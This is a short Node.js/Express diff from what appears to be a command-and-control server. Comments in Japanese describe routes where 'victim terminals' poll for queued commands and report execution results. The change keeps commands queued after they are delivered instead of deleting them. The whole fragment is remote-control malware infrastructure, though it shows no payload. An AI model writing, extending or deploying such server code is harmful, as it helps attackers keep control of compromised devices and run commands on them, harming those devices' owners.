@@ -94,14 +94,14 @@ app.post("/api/send", (req, res) => {
     });
 });
 
-// API: 被害端末のポーリング → 待機中コマンドを返す
 app.post("/api/poll", (req, res) => {
   for (const [id, data] of pendingCommands.entries()) {
-    pendingCommands.delete(id);
+    // pendingCommands.delete(id); ← 削除しない
     return res.json({ id, command: data.command });
   }
   res.status(204).send();
 });
+
 
 // API: 被害端末の実行結果報告
 app.post("/api/report", (req, res) => {
